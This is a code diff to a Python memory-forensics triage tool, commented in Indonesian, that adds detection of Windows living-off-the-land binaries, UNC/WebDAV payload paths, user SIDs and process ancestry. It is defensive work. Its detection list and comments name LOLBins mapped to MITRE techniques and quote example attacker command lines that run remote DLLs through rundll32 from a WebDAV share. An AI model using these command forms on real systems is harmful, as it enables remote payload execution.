@@ -7,6 +7,7 @@ tidak pernah menyentuh disk.
 """
 import json
 import re
+from pathlib import Path
 
 from .. import config as settings
 from . import tools
@@ -91,6 +92,152 @@ def get_system_info(dump_path) -> dict:
         "processors": info.get("KeNumberProcessors"),
         "system_time": info.get("SystemTime"),
     }
+
+
+# Binary Windows sah yang bisa dipakai menjalankan kode pihak ketiga
+# ("living off the land"). Yang dicari bukan keberadaannya -- semuanya bawaan
+# Windows dan lazim -- melainkan APA yang mereka jalankan.
+LOLBINS = {
+    "rundll32.exe": ("T1218.011", "Rundll32"),
+    "regsvr32.exe": ("T1218.010", "Regsvr32"),
+    "mshta.exe": ("T1218.005", "Mshta"),
+    "msiexec.exe": ("T1218.007", "Msiexec"),
+    "installutil.exe": ("T1218.004", "InstallUtil"),
+    "regasm.exe": ("T1218.009", "Regsvcs/Regasm"),
+    "regsvcs.exe": ("T1218.009", "Regsvcs/Regasm"),
+    "cmstp.exe": ("T1218.003", "CMSTP"),
+    "odbcconf.exe": ("T1218.008", "Odbcconf"),
+    "mavinject.exe": ("T1218.013", "Mavinject"),
+    "verclsid.exe": ("T1218.012", "Verclsid"),
+    "hh.exe": ("T1218.001", "Compiled HTML File"),
+    "control.exe": ("T1218.002", "Control Panel"),
+    "mmc.exe": ("T1218.014", "MMC"),
+    "certutil.exe": ("T1105", "Ingress Tool Transfer"),
+    "bitsadmin.exe": ("T1197", "BITS Jobs"),
+    "wmic.exe": ("T1047", "Windows Management Instrumentation"),
+    "cscript.exe": ("T1059.005", "Visual Basic"),
+    "wscript.exe": ("T1059.005", "Visual Basic"),
+    "powershell.exe": ("T1059.001", "PowerShell"),
+    "cmd.exe": ("T1059.003", "Windows Command Shell"),
+}
+
+# Berkas yang, bila dijalankan LEWAT LOLBin, hampir selalu berarti muatan tahap
+# kedua -- bukan pemakaian normal utilitas tersebut.
+PAYLOAD_EXTENSIONS = (".dll", ".ocx", ".cpl", ".hta", ".sct", ".xsl", ".vbs",
+                      ".js", ".jse", ".wsf", ".ps1", ".bat", ".cmd", ".scr", ".exe")
+
+# Host UNC boleh memuat '@' dan port: '\\45.9.74.32@8888\davwwwroot\' adalah
+# sintaks WebDAV yang lazim dipakai mengambil muatan lewat HTTP, dan justru
+# bentuk itulah yang sering dipakai penyerang untuk menghindari SMB yang diblokir.
+# Tanpa '@' dan ':' di kelas karakter, ekstraksi share gagal DIAM-DIAM.
+UNC_PATTERN = re.compile(r"\\\\[\w.\-@:]+\\[\w.$\-]+(?:\\[^\s\"'<>|,]*)?")
+
+
+def get_user_sids(dump_path) -> dict[int, dict]:
+    """
+    windows.getsids — pemilik tiap proses.
+
+    Nama pengguna TIDAK ada di pslist maupun cmdline; ia hanya keluar dari
+    plugin ini. Tanpa itu, pertanyaan "akun mana yang dipakai proses berbahaya"
+    tidak terjawab sama sekali, padahal itu penentu ruang lingkup insiden.
+    """
+    rows = run_plugin(dump_path, "windows.getsids.GetSIDs")
+    owners: dict[int, dict] = {}
+    for row in rows:
+        pid, name = row.get("PID"), str(row.get("Name") or "")
+        if pid is None or not name:
+            continue
+        entry = owners.setdefault(int(pid), {"sids": [], "user": None})
+        entry["sids"].append({"sid": row.get("SID"), "name": name})
+        # SID akun pengguna berbentuk S-1-5-21-<domain>-<RID>; grup bawaan dan
+        # SID sistem tidak berpola itu, jadi tidak boleh dianggap nama pengguna.
+        sid = str(row.get("SID") or "")
+        if sid.startswith("S-1-5-21-") and "\\" in name and entry["user"] is None:
+            entry["user"] = name
+        elif sid.startswith("S-1-5-21-") and entry["user"] is None and " " not in name:
+            entry["user"] = name
+    return owners
+
+
+def find_lolbin_execution(cmdlines: list[dict]) -> list[dict]:
+    """
+    Utilitas Windows sah yang dipakai menjalankan berkas lain.
+
+    Keberadaan rundll32 atau mshta di daftar proses itu normal. Yang menandakan
+    serangan adalah SASARANNYA: berkas di direktori pengguna, share jaringan,
+    atau berekstensi muatan.
+    """
+    findings = []
+    for entry in cmdlines:
+        process = str(entry.get("Process") or "").lower()
+        args = str(entry.get("Args") or "")
+        if not args:
+            continue
+
+        targets = [t for t in re.findall(r"[^\s\"',]+", args)
+                   if t.lower().endswith(PAYLOAD_EXTENSIONS)]
+        unc = UNC_PATTERN.findall(args)
+        if not targets and not unc:
+            continue
+
+        # LOLBin yang dipakai bisa berupa proses ITU SENDIRI, atau disebut DI
+        # DALAM command line-nya. Kasus kedua sangat lazim dan mudah terlewat:
+        #   powershell.exe -windowstyle hidden ... ; rundll32 \\host\share\x.dll,entry
+        # Proses yang terdaftar adalah powershell, tapi yang mengeksekusi muatan
+        # tahap kedua adalah rundll32 -- dan sub-technique MITRE-nya ikut yang
+        # kedua, bukan yang pertama.
+        used = []
+        if process in LOLBINS:
+            used.append((process, "proses itu sendiri"))
+        for binary in LOLBINS:
+            stem = binary[:-4]
+            if binary == process:
+                continue
+            if re.search(rf"(?<![\w.]){re.escape(stem)}(?:\.exe)?(?![\w.])", args, re.I):
+                used.append((binary, "dipanggil di dalam command line"))
+        if not used:
+            continue
+
+        for binary, how in used:
+            technique, name = LOLBINS[binary]
+            # Nama utilitas yang MENJALANKAN, dan nama proses itu sendiri, bukan
+            # muatan. Tanpa penyaringan ini 'rundll32 ... 3435.dll' dilaporkan
+            # seolah rundll32 menjalankan powershell.exe.
+            excluded = {binary, process}
+            own = [t for t in targets if Path(t).name.lower() not in excluded]
+            findings.append({
+                "pid": entry.get("PID"), "process": entry.get("Process"),
+                "lolbin": binary, "invocation": how,
+                "mitre_technique": technique, "mitre_name": name,
+                "targets": own, "unc_paths": unc,
+                "args": args[:400],
+                "confidence": "HIGH" if (unc or own) else "MEDIUM",
+                "note": f"{binary} ({how}) dipakai menjalankan "
+                        f"{', '.join(own or unc)}. MITRE {technique} ({name}).",
+            })
+    return findings
+
+
+def extract_unc_paths(cmdlines: list[dict]) -> list[dict]:
+    """
+    Path UNC di command line: berkas yang diambil dari server jarak jauh.
+
+    Menandakan muatan tidak berasal dari mesin ini, dan menyebut nama server
+    beserta share-nya -- keduanya IOC yang bisa langsung dicari di jaringan.
+    """
+    found: dict[str, dict] = {}
+    for entry in cmdlines:
+        for path in UNC_PATTERN.findall(str(entry.get("Args") or "")):
+            parts = path.strip("\\").split("\\")
+            record = found.setdefault(path, {
+                "unc_path": path,
+                "host": parts[0] if parts else None,
+                "share": parts[1] if len(parts) > 1 else None,
+                "used_by": [],
+            })
+            record["used_by"].append({"pid": entry.get("PID"),
+                                      "process": entry.get("Process")})
+    return list(found.values())
 
 
 def get_process_list(dump_path) -> list[dict]:
@@ -206,6 +353,42 @@ def find_name_path_mismatch(cmdlines: list[dict]) -> list[dict]:
     return findings
 
 
+def build_process_tree(processes: list[dict], owners: dict | None = None,
+                       cmdlines: list[dict] | None = None) -> list[dict]:
+    """
+    Rantai induk tiap proses, bukan sekadar nomor PPID.
+
+    "PPID 2820" tidak berarti apa-apa sendirian. Yang menjelaskan alur serangan
+    adalah rantainya: explorer.exe -> cmd.exe -> rundll32.exe. Proses induk yang
+    sudah tidak ada juga dinyatakan, karena itu sendiri sebuah temuan.
+    """
+    by_pid = {p.get("PID"): p for p in processes if p.get("PID") is not None}
+    args_by_pid = {c.get("PID"): c.get("Args") for c in (cmdlines or [])}
+    owners = owners or {}
+
+    tree = []
+    for proc in processes:
+        pid, ppid = proc.get("PID"), proc.get("PPID")
+        chain, seen = [], set()
+        current = ppid
+        while current in by_pid and current not in seen:
+            seen.add(current)
+            chain.append(f"{by_pid[current].get('ImageFileName')} ({current})")
+            current = by_pid[current].get("PPID")
+        tree.append({
+            "pid": pid, "ppid": ppid,
+            "name": proc.get("ImageFileName"),
+            "parent_name": (by_pid[ppid].get("ImageFileName") if ppid in by_pid
+                            else None),
+            "parent_exists": ppid in by_pid,
+            "ancestry": " <- ".join(chain) or "(induk tidak ada di dump)",
+            "user": (owners.get(pid) or {}).get("user"),
+            "create_time": proc.get("CreateTime"),
+            "args": args_by_pid.get(pid),
+        })
+    return tree
+
+
 def find_orphan_processes(processes: list[dict]) -> list[dict]:
     """
     Proses yang PPID-nya tidak ada di daftar proses.
@@ -274,9 +457,40 @@ def full_memory_triage(dump_path, threat_checker=None,
     cmdlines = get_command_lines(dump_path)
     injected = detect_code_injection(dump_path)
 
+    owners = get_user_sids(dump_path)
     suspicious_cmd = flag_suspicious_cmdlines(cmdlines)
     orphans = find_orphan_processes(processes)
     hollowing = find_name_path_mismatch(cmdlines)
+    lolbins = find_lolbin_execution(cmdlines)
+    unc_paths = extract_unc_paths(cmdlines)
+    tree = build_process_tree(processes, owners, cmdlines)
+    by_pid = {t["pid"]: t for t in tree}
+
+    # Nama pengguna dan rantai induk ditempelkan ke tiap temuan: pertanyaan
+    # "akun mana" dan "apa induknya" selalu menyusul begitu sebuah proses
+    # dicurigai, dan mencarinya manual di daftar 100+ proses itu pekerjaan sia-sia.
+    for group in (suspicious_cmd, hollowing, lolbins):
+        for item in group:
+            context = by_pid.get(item.get("pid")) or {}
+            item["user"] = context.get("user")
+            item["ppid"] = context.get("ppid")
+            item["parent_name"] = context.get("parent_name")
+            item["ancestry"] = context.get("ancestry")
+
+    for item in lolbins:
+        evidence.track(
+            "lolbin_execution", f"vol -f <dump> windows.cmdline --pid {item['pid']}",
+            f"{item['process']} (PID {item['pid']}) menjalankan "
+            f"{', '.join(item['targets'] or item['unc_paths'])}",
+            note=item["note"] + f" Induk: {item.get('parent_name')} "
+                 f"(PPID {item.get('ppid')}). Pengguna: {item.get('user') or 'tidak diketahui'}.")
+    for item in unc_paths:
+        evidence.track(
+            "remote_share_access", f"vol -f <dump> windows.cmdline",
+            item["unc_path"],
+            note=f"Share '{item['share']}' pada host '{item['host']}' diakses oleh "
+                 + ", ".join(f"{u['process']} (PID {u['pid']})" for u in item["used_by"])
+                 + ". Muatan berasal dari luar mesin ini.")
     persistence = find_persistence(cmdlines)
     for item in persistence:
         evidence.track("persistence_mechanism",
@@ -348,6 +562,11 @@ def full_memory_triage(dump_path, threat_checker=None,
         "suspicious_command_lines": suspicious_cmd,
         "process_hollowing": hollowing,
         "persistence": persistence,
+        "lolbin_execution": lolbins,
+        "remote_shares": unc_paths,
+        "process_tree": tree,
+        "users": {str(pid): info.get("user") for pid, info in owners.items()
+                  if info.get("user")},
         "orphan_processes": orphans,
         "malicious_connections": malicious_connections,
         "notable_connections": notable_connections(connections),
